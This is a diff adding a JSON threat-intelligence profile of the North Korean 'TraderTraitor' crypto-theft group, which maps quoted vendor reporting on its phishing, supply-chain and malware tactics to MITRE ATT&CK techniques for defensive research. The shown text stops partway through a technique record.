@@ -1,0 +1,5468 @@
+{
+  "aliases": [
+    "Jade Sleet",
+    "UNC4899",
+    "Slow Pisces",
+    "Pukchong"
+  ],
+  "attack_id": null,
+  "attack_modified": "2026-11-05T15:11:27.678Z",
+  "attack_url": null,
+  "attack_version": "20.1",
+  "attacks": [
+    {
+      "first_seen": "2025-07-28",
+      "id": "INC-0310",
+      "kind": "reported_activity",
+      "last_seen": "2025-07-28",
+      "name": "TraderTraitor: Deep Dive",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-01-01",
+      "id": "INC-0334",
+      "kind": "reported_activity",
+      "last_seen": "2026-01-01",
+      "name": "The Mac Malware of 2025",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Objective-See: The Mac Malware of 2025",
+          "url": "https://objective-see.org/blog/blog_0x84.html"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-10-30",
+      "id": "INC-0050",
+      "kind": "reported_activity",
+      "last_seen": "2026-10-30",
+      "name": "North Korean hackers blamed for stealing record $6.3B in Binance breach",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "TechCrunch security: North Korean hackers blamed for stealing record $6.3B in Binance breach",
+          "url": "https://techcrunch.com/2026/10/30/north-korean-hackers-blamed-for-stealing-record-6-3b-in-binance-breach/"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-10-30",
+      "id": "INC-0052",
+      "kind": "reported_activity",
+      "last_seen": "2026-10-30",
+      "name": "$6 Billion Binance Hack Bears Hallmarks of North Korea’s TraderTraitor",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: $6 Billion Binance Hack Bears Hallmarks of North Korea’s TraderTraitor",
+          "url": "https://www.securityweek.com/6-billion-binance-hack-bears-hallmarks-of-north-koreas-tradertraitor/"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-11-02",
+      "id": "INC-0047",
+      "kind": "reported_activity",
+      "last_seen": "2026-11-02",
+      "name": "One Compromised Laptop, Billions Lost: The Binance Attack-Path Warning",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Dark Reading: One Compromised Laptop, Billions Lost: The Binance Attack-Path Warning",
+          "url": "https://www.darkreading.com/cyberattacks-data-breaches/binance-hack-test-attack-paths"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-11-02",
+      "id": "INC-0051",
+      "kind": "reported_activity",
+      "last_seen": "2026-11-02",
+      "name": "FBI Flags Over 600 Addresses Tied to North Korea’s Binance Heist",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: FBI Flags Over 600 Addresses Tied to North Korea’s Binance Heist",
+          "url": "https://www.securityweek.com/fbi-flags-over-600-addresses-tied-to-north-koreas-binance-heist/"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-11-04",
+      "id": "INC-0025",
+      "kind": "reported_activity",
+      "last_seen": "2026-11-04",
+      "name": "Rigged Coding Assignment, Abused AI Tool Opened Path to $6 Billion Binance Heist",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Rigged Coding Assignment, Abused AI Tool Opened Path to $6 Billion Binance Heist",
+          "url": "https://www.securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist/"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-11-12",
+      "id": "INC-0358",
+      "kind": "reported_activity",
+      "last_seen": "2026-11-12",
+      "name": "Feds announce seizure of $1.2 billion from Binance theft; also takedown of ‘FaceStealer’ tools",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "The Record: Feds announce seizure of $1.2 billion from Binance theft; also takedown of ‘FaceStealer’ tools",
+          "url": "https://therecord.media/stolen-binance-crypto-recovered-doj-facestealer-disrupted"
+        }
+      ],
+      "summary": null,
+      "url": null
+    },
+    {
+      "first_seen": "2026-11-13",
+      "id": "INC-0370",
+      "kind": "reported_activity",
+      "last_seen": "2026-11-13",
+      "name": "FBI Says US Seized $1.2 Billion Worth of Cryptocurrency Stolen From Binance",
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek cybercrime: FBI Says US Seized $1.2 Billion Worth of Cryptocurrency Stolen From Binance",
+          "url": "https://www.securityweek.com/fbi-says-us-seized-1-2-billion-worth-of-cryptocurrency-stolen-from-binance/"
+        }
+      ],
+      "summary": null,
+      "url": null
+    }
+  ],
+  "bfsi": {
+    "reason": "FBI attributed the Bybit theft (~US$1.5B, Feb 2025) and, with Japan's NPA, the DMM Bitcoin theft (~US$308M, May 2024) to DPRK \"TraderTraitor\"; TRM Labs attributed KelpDAO (~US$292M, Apr 2026) to TraderTraitor. No ATT&CK group object exists (verified v20.1).",
+    "tier": 1
+  },
+  "country": "North Korea (DPRK)",
+  "counts": {
+    "attack_rows": 0,
+    "reviewed_rows": 132,
+    "rows": 132,
+    "techniques": 98
+  },
+  "description": "TraderTraitor is the FBI's name for North Korean (DPRK) cyber activity focused on stealing cryptocurrency from exchanges and other crypto-finance firms. The FBI attributed the February 2025 theft of roughly US$1.5 billion from the Bybit exchange to TraderTraitor (the operation manipulated the signing interface of a multisig cold wallet during a transfer), and, together with Japan's National Police Agency, the May 2024 theft of about US$308 million from DMM Bitcoin. Vendor reporting tracks overlapping activity as Jade Sleet, UNC4899 and Slow Pisces; these names overlap with, but are not exact equivalents of, APT38 (BlueNoroff/Sapphire Sleet) and Lazarus Group. MITRE ATT&CK has no TraderTraitor group object, so this page lists only analyst-reviewed mappings from public reporting.",
+  "description_references": [
+    {
+      "citation": null,
+      "source_name": "FBI PSA 250226 - North Korea responsible for Bybit hack",
+      "url": "https://www.ic3.gov/PSA/2025/PSA250226"
+    },
+    {
+      "citation": null,
+      "source_name": "Security Affairs - FBI: North Korea responsible for Bybit hack",
+      "url": "https://securityaffairs.com/174735/cyber-crime/fbi-north-korea-responsible-bybit-hack.html"
+    },
+    {
+      "citation": null,
+      "source_name": "The Block / TRM Labs - DPRK 76% of 2026 crypto hack losses",
+      "url": "https://www.theblock.co/amp/post/399569/north-korea-accounts-for-76-of-2026-crypto-hack-losses-with-theft-since-2017-topping-6-billion-trm-labs"
+    }
+  ],
+  "description_source": "curated",
+  "disclaimer": "Group attributions and aliases reflect public reporting by the cited vendors and agencies. Attribution is probabilistic and naming overlaps are imperfect; inclusion does not imply a definitive link to any nation-state. Reviewed auto-mappings are analyst-approved proposals from a local mapping engine. For defensive research only. Not affiliated with or endorsed by MITRE.",
+  "downloads": {
+    "csv": "csv/tradertraitor.csv",
+    "navigator_layer": "layers/tradertraitor.json",
+    "navigator_url": "https://mitre-attack.github.io/attack-navigator/#layerURL=https%3A%2F%2Fmadhavv13.github.io%2Fbfsi%2Flayers%2Ftradertraitor.json"
+  },
+  "id": "LOCAL-TRADERTRAITOR",
+  "last_updated": "2026-11-13",
+  "motivation": "Financial gain (cryptocurrency theft)",
+  "name": "TraderTraitor",
+  "notice": "© 2026 The MITRE Corporation. This work is reproduced and distributed with the permission of The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.",
+  "rows": [
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "low",
+      "description": "“Wiz Sensor customers can investigate any outgoing connections to campaign-associated IP addresses, and Wiz Defend customers can further investigate by querying for events initiated by principals connecting from IP addresses linked to this campaign.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1590.005",
+        "name": "Gather Victim Network Information: IP Addresses",
+        "parent_id": "T1590",
+        "url": "https://attack.mitre.org/techniques/T1590/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“In early February 2025, the attacker set up infrastructure by registering the domain getstockprice[.]com, which was later used as a command-and-control (C2) endpoint.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.001",
+        "name": "Acquire Infrastructure: Domains",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“Defense Evasion Acquire Code Signing Certificate (T1588.003) Threat actor obtains or uses compromised certs to sign apps.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1588.003",
+        "name": "Obtain Capabilities: Code Signing Certificates",
+        "parent_id": "T1588",
+        "url": "https://attack.mitre.org/techniques/T1588/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“In this way, TraderTraitor apps delivered malware such as MANUSCRYPT (a remote access trojan) onto victims’ systems.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1608.001",
+        "name": "Stage Capabilities: Upload Malware",
+        "parent_id": "T1608",
+        "url": "https://attack.mitre.org/techniques/T1608/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“Persistence Valid Accounts (T1078) Stolen credentials (cookies, keys) used to maintain access as a legitimate user.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        },
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1078"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“In addition to leveraging traditional techniques such as sending phishing emails and infecting victims with trojanized software, TraderTraitor has conducted more complex operations including supply chain compromises and diverting legitimate transactions.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1195",
+        "name": "Supply Chain Compromise",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1195"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“After establishing trust (often via LinkedIn or other social contact), the TraderTraitor operators invited the victims to collaborate on a GitHub repository that contained malicious JavaScript packages sourced from npm as dependencies [T1195.001].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1195.001",
+        "name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "parent_id": "T1195",
+        "url": "https://attack.mitre.org/techniques/T1195/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“In that case, TraderTraitor (UNC4899) compromised JumpCloud’s platform via spear-phishing, then abused JumpCloud’s privileged access to push a malicious update [T1195.002] to a handful of cryptocurrency industry customers [T1199].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1195.002",
+        "name": "Supply Chain Compromise: Compromise Software Supply Chain",
+        "parent_id": "T1195",
+        "url": "https://attack.mitre.org/techniques/T1195/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“In that case, TraderTraitor (UNC4899) compromised JumpCloud’s platform via spear-phishing, then abused JumpCloud’s privileged access to push a malicious update [T1195.002] to a handful of cryptocurrency industry customers [T1199].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1199",
+        "name": "Trusted Relationship",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1199"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“In addition to leveraging traditional techniques such as sending phishing emails and infecting victims with trojanized software, TraderTraitor has conducted more complex operations including supply chain compromises and diverting legitimate transactions.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566",
+        "name": "Phishing",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1566"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“By mid-2022, TraderTraitor’s trojan apps were implicated in major thefts, such as the Ronin Network (Axie Infinity) breach where Lazarus stole $620 million after compromising a blockchain game company employee via a fake job offer PDF [T1566.001] and application (this incident…” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566.001",
+        "name": "Phishing: Spearphishing Attachment",
+        "parent_id": "T1566",
+        "url": "https://attack.mitre.org/techniques/T1566/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“MITRE Tactic Technique & ID TraderTraitor Example Initial Access Spearphishing Link/Attachment (T1566.002) LinkedIn recruiter sends target a malicious app or GitHub link.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566.002",
+        "name": "Phishing: Spearphishing Link",
+        "parent_id": "T1566",
+        "url": "https://attack.mitre.org/techniques/T1566/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“According to a U.S. government advisory, the attackers send phishing messages [T1566.003] on platforms like LinkedIn, Slack, or Telegram to employees of crypto companies (especially those in DevOps, IT, or system admin roles).” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1566.003",
+        "name": "Phishing: Spearphishing via Service",
+        "parent_id": "T1566",
+        "url": "https://attack.mitre.org/techniques/T1566/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“MANUSCRYPT would then harvest system info [T1082], execute arbitrary commands [T1059], and ultimately seek out cryptocurrency wallet keys or credentials to enable theft of funds.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1059"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“The attack on Ginco and DMM bitcoin (4502.9 BTC or 308 million USD) In March 2024, a TraderTraitor operative posed as a recruiter and lured a developer at Ginco into running a malicious Python script from a fake coding challenge hosted on GitHub [T1059.006,T1204.002].” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.006",
+        "name": "Command and Scripting Interpreter: Python",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/006"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“These malicious apps – built on JavaScript [T1059.007] and Node.js using the Electron framework – are referred to collectively as \"TraderTraitor\" apps by U.S. authorities.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.007",
+        "name": "Command and Scripting Interpreter: JavaScript",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/007"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“These messages posed as recruiters offering lucrative jobs and enticed targets to download fake crypto applications [T1204.002] that contain malicious payloads.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.002",
+        "name": "User Execution: Malicious File",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "high",
+      "description": "“This application included a malicious docker image [T1609] and contacted the attacker’s domain.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "explicit_id",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1609",
+        "name": "Container Administration Command",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1609"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
+      "description": "“Detection Wiz Defend customers can monitor for enumeration attempts, cloud key compromise, suspicious MFA device registration, and many other techniques employed by TraderTraitor.” — Wiz Blog",
+      "provenance": {
+        "article_source": "Wiz Blog",
+        "article_url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "Wiz Blog: TraderTraitor: Deep Dive",
+          "url": "https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1098.005",
+        "name": "Account Manipulation: Device Registration",
+        "parent_id": "T1098",
+        "url": "https://attack.mitre.org/techniques/T1098/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0310",
+      "confidence": "medium",
